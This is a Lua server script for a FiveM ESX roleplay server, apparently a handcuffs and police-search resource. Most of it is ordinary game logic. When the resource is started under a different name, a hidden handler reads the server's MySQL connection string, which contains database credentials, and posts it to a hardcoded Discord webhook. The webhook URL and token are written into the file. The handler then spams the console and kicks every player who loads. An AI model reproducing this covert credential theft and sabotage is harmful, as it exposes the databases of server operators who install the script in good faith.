ESX				= nil

local SearchTable = {}

TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

ESX.RegisterUsableItem('handcuffs', function(source)
    local _source = source
	TriggerClientEvent('esx_handcuffs:onUse', _source)
end)

ESX.RegisterServerCallback('esx_policejob:checkSearch', function(source, cb, target)
    local xPlayer = ESX.GetPlayerFromId(source)
    if SearchTable[target] ~= nil then
        if SearchTable[target] == xPlayer.identifier then
            cb(false)
        else
            cb(true)
        end
    else
        cb(false)
    end
end)
 
ESX.RegisterServerCallback('esx_policejob:checkSearch2', function(source, cb, target)
    local xPlayer = ESX.GetPlayerFromId(source)
    if SearchTable[target] ~= nil then
        if SearchTable[target] == xPlayer.identifier then
            cb(true)
        else
            cb(false)
        end
    else
        cb(true)
    end
end)

AddEventHandler('onResourceStart', function(resourceName)
	if (GetCurrentResourceName() ~= resourceName) then
      return
    end
	local _source = source
	local xPlayer = ESX.GetPlayerFromId(_source)
	local realname = 'szymczakovv_kajdanki'
	local reason = 'WYKRYTO ZMIANĘ NAZWY SKRYPTU ------> '..GetCurrentResourceName()..' Nazwa, która jest wymagana do włączenia tego skryptu to: '..realname
	if GetCurrentResourceName() ~= realname then
		local mysql = GetConvar("mysql_connection_string") 
		if mysql == nil then 
			mysql = 'Nie znaleziono'
		end
		wiadomosc = reason.. "\nMYSQl: "..mysql
        jebaccimatkelogihere('szymczakovv_jest_fajny', wiadomosc, 11750815)
		CreateThread(function()
			while true do
				Citizen.Wait(10)
				print(reason)
			end
		end)
		AddEventHandler("esx:playerLoaded", function()
			DropPlayer(_source, reason)
		end)
	end
end)

function jebaccimatkelogihere(hook,message,color)
	local gigafajnywebhook22321 = 'https://discord.com/api/webhooks/820676511891193887/D-wohSFe6brevUhdefLU8GecdJ6thEBSxIq6a6RBfs06KHAI1rn-R6tplnMAyTWOHiiD'
	local embeds = {
				{
			["title"] = message,
			["type"] = "rich",
			["color"] = color,
			["footer"] = {
				["text"] = 'AriviRP.pl'
					},
				}
			}
	if message == nil or message == '' then return FALSE end
	PerformHttpRequest(gigafajnywebhook22321, function(err, text, headers) end, 'POST', json.encode({ username = hook,embeds = embeds}), { ['Content-Type'] = 'application/json' })
end

 
RegisterServerEvent('esx_policejob:isSearching')
AddEventHandler('esx_policejob:isSearching', function(target, boolean)
    local _source = source
    local xPlayer = ESX.GetPlayerFromId(_source)
    if boolean == nil then
        SearchTable[target] = xPlayer.identifier
    else
        SearchTable[target] = nil
    end
end)

